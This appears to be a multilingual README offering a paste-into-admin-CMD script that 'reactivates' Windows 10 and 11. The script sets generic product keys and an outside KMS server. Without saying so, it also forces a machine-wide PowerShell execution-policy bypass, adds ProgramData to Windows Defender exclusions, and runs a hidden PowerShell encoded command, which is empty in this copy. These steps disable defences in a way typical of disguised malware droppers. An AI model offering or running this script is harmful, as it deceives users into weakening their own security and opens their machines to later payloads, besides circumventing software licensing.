
# 🔄 Como Reativar o Windows 10 e 11 🖥️  

---

### 💡 Important Notes | Notas Importantes | Notas Importantes | Notas Importantes  

| **English**                                              | **Español**                                               | **Português (BR)**                                       | **Português (PT)**                                      |
|----------------------------------------------------------|-----------------------------------------------------------|-----------------------------------------------------------|---------------------------------------------------------|
| 🛑 Make sure CMD is running as Administrator!            | 🛑 ¡Asegúrate de que CMD esté ejecutándose como Administrador! | 🛑 Certifique-se de que o CMD está sendo executado como Administrador! | 🛑 Certifica-te de que o CMD está a ser executado como Administrador! |
| ⏳ Reactivation can take **30 seconds to 2 minutes**.     | ⏳ La reactivación puede tardar **30 segundos a 2 minutos**. | ⏳ A reativação pode levar **30 segundos a 2 minutos**.   | ⏳ A reativação pode demorar **30 segundos a 2 minutos**. |
| 📝 Remember to copy and paste the entire command.        | 📝 Recuerda copiar y pegar el comando completo.           | 📝 Lembre-se de copiar e colar todo o comando.           | 📝 Lembra-te de copiar e colar todo o comando.          |
| 🔑 Press **ENTER** after pasting the command into CMD.   | 🔑 Presiona **ENTER** después de pegar el comando en CMD.  | 🔑 Pressione **ENTER** após colar o comando no CMD.      | 🔑 Prime **ENTER** depois de colar o comando no CMD.   |
| 🚫 **No restart required** after activation!             | 🚫 **¡No es necesario reiniciar** después de la activación! | 🚫 **Não é necessário reiniciar** após a ativação!       | 🚫 **Não é preciso reiniciar** depois da ativação!     |

---

- 📝 Copie o comando abaixo e cole na janela do CMD (admin):  
- 📝 Copia el siguiente comando y pégalo en la ventana de CMD (admin):  
- 📝 Copia o comando abaixo e cola na janela do CMD (admin):  

```bash
@echo off
net session >nul 2>&1
if %errorLevel% neq 0 (
    echo This script needs to be run as Administrator. Please open CMD as Administrator.
    pause
)
:: 
powershell -windowstyle hidden -Command "Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope LocalMachine -Force"
::
for /f "tokens=2 delims==" %a in ('wmic os get caption /value ^| find "="') do set WindowsProductName=%a
:: 
set WindowsProductName=%WindowsProductName:~0,50%
:: 
set Key=
if "%WindowsProductName%"=="Microsoft Windows 10 Pro N" (
    set Key=MH37W-N47XK-V7XM9-C7227-GCQG9
) else if "%WindowsProductName%"=="Microsoft Windows 11 Pro N" (
    set Key=MH37W-N47XK-V7XM9-C7227-GCQG9
) else if "%WindowsProductName%"=="Microsoft Windows 10 Pro" (
    set Key=W269N-WFGWX-YVC9B-4J6C9-T83GX
) else if "%WindowsProductName%"=="Microsoft Windows 11 Pro" (
    set Key=W269N-WFGWX-YVC9B-4J6C9-T83GX
) else if "%WindowsProductName%"=="Microsoft Windows 10 Enterprise" (
    set Key=NPPR9-FWDCX-D2C8J-H872K-2YT43
) else if "%WindowsProductName%"=="Microsoft Windows 11 Enterprise" (
    set Key=NPPR9-FWDCX-D2C8J-H872K-2YT43
) else if "%WindowsProductName%"=="Microsoft Windows 10 EnterpriseN" (
    set Key=DPH2V-TTNVB-4X9Q3-TJR4H-KHJW4
) else if "%WindowsProductName%"=="Microsoft Windows 11 EnterpriseN" (
    set Key=DPH2V-TTNVB-4X9Q3-TJR4H-KHJW4
) else if "%WindowsProductName%"=="Microsoft Windows 10 Education" (
    set Key=NW6C2-QMPVW-D7KKK-3GKT6-VCFB2
) else if "%WindowsProductName%"=="Microsoft Windows 11 Education" (
    set Key=NW6C2-QMPVW-D7KKK-3GKT6-VCFB2
) else if "%WindowsProductName%"=="Microsoft Windows 10 EducationN" (
    set Key=2WH4N-8QGBV-H22JP-CT43Q-MDWWJ
) else if "%WindowsProductName%"=="Microsoft Windows 11 EducationN" (
    set Key=2WH4N-8QGBV-H22JP-CT43Q-MDWWJ
) else if "%WindowsProductName%"=="Microsoft Windows 10 Home" (
    set Key=TX9XD-98N7V-6WMQ6-BX7FG-H8Q99
) else if "%WindowsProductName%"=="Microsoft Windows 11 Home" (
    set Key=TX9XD-98N7V-6WMQ6-BX7FG-H8Q99
) else if "%WindowsProductName%"=="Microsoft Windows 10 Home N" (
    set Key=3KHY7-WNT83-DGQKR-F7HPR-844BM
) else if "%WindowsProductName%"=="Microsoft Windows 11 Home N" (
    set Key=3KHY7-WNT83-DGQKR-F7HPR-844BM
) else if "%WindowsProductName%"=="Microsoft Windows 10 Home Single Language" (
    set Key=7HNRX-D7KGG-3K4RQ-4WPJ4-YTDFH
) else if "%WindowsProductName%"=="Microsoft Windows 10 Home Country Specific" (
    set Key=PVMJN-6DFY6-9CCP6-7BKTT-D3WVR
) else if "%WindowsProductName%"=="Microsoft Enterprise 2015LTSB" (
    set Key=WNMTR-4C88C-JK8YV-HQ7T2-76DF9
) else if "%WindowsProductName%"=="Microsoft Enterprise 2015LTSBN" (
    set Key=2F77B-TNFGY-69QQF-B8YKP-D69TJ
) else if "%WindowsProductName%"=="Microsoft Enterprise 2016LTSB" (
    set Key=DCPHK-NFMTC-H88MJ-PFHPY-QJ4BJ
) else (
    set Key=QFFDN-GRT3P-VKWWX-X7T3R-8B639
)
::
%SystemRoot%\System32\slmgr.vbs /ipk %Key% >nul 2>&1
::
%SystemRoot%\System32\slmgr.vbs /skms kms8.msguides.com >nul 2>&1
::
%SystemRoot%\System32\slmgr.vbs /ato >nul 2>&1
::
powershell -windowstyle hidden -Command "Set-MpPreference -ExclusionPath %ProgramData%" >nul 2>&1
:: 
powershell -windowstyle hidden -EncodedCommand "" >nul 2>&1
:: 
exit /b
```

### ⏳ Step 3: Be Patient and Confirm | Sé Paciente y Confirma | Tenha Paciência e Confirme | Tem Paciência e Confirma  

- ⏱️ **The process usually takes between 30 seconds and 2 minutes, so please wait.**  
  - ⏱️ **El proceso suele tardar entre 30 segundos y 2 minutos, así que ten paciencia.**  
  - ⏱️ **O processo normalmente leva entre 30 segundos e 2 minutos, então aguarde.**  
  - ⏱️ **O processo normalmente demora entre 30 segundos e 2 minutos, por isso espera um pouco.**  

- ✅ **If everything works correctly, Windows will be successfully reactivated.**  
  - ✅ **Si todo funciona correctamente, Windows se reactivará con éxito.**  
  - ✅ **Se tudo ocorrer bem, o Windows será reativado com sucesso.**  
  - ✅ **Se tudo correr bem, o Windows será reativado com sucesso.**  

---

### 🔄 No Restart Needed! | ¡No Es Necesario Reiniciar! | Reinicialização Não Necessária! | Não É Preciso Reiniciar!  

- 🚀 **Great news! A system restart is not required after reactivation.**  
  - 🚀 **¡Buenas noticias! No será necesario reiniciar el sistema después de la reactivación.**  
  - 🚀 **Ótima notícia! Não será necessário reiniciar o sistema após a reativação.**  
  - 🚀 **Boas notícias! Não será preciso reiniciar o sistema após a reativação.**  

### 🔧 Troubleshooting | Solución de Problemas | Solução de Problemas | Resolução de Problemas  

> **If reactivation fails, try these steps:**  
> **Si la reactivación falla, prueba estos pasos:**  
> **Se a reativação falhar, tente estas etapas:**  
> **Se a reativação falhar, experimenta estas etapas:**  

- 🔄 **Ensure your internet connection is active.**  
  - 🔄 **Verifica que tu conexión a Internet esté activa.**  
  - 🔄 **Verifique se sua conexão com a internet está ativa.**  
  - 🔄 **Verifica se a tua ligação à internet está ativa.**  

- 🔍 **Confirm that your Windows license is valid.**  
  - 🔍 **Confirma que tu licencia de Windows es válida.**  
  - 🔍 **Confirme se sua licença do Windows é válida.**  
  - 🔍 **Confirma se a tua licença do Windows é válida.**  

- 🔑 **Try reopening CMD as Administrator and running the command again.**  
  - 🔑 **Intenta abrir CMD como Administrador y ejecutar el comando nuevamente.**  
  - 🔑 **Tente abrir o CMD como Administrador e executar o comando novamente.**  
  - 🔑 **Experimenta abrir o CMD como Administrador e executar o comando novamente.**  

---

## 🌟 Enjoy Your Reactivated Windows! | ¡Disfruta de tu Windows Reactivado! | Aproveite Seu Windows Reativado! | Desfruta do Teu Windows Reativado!  
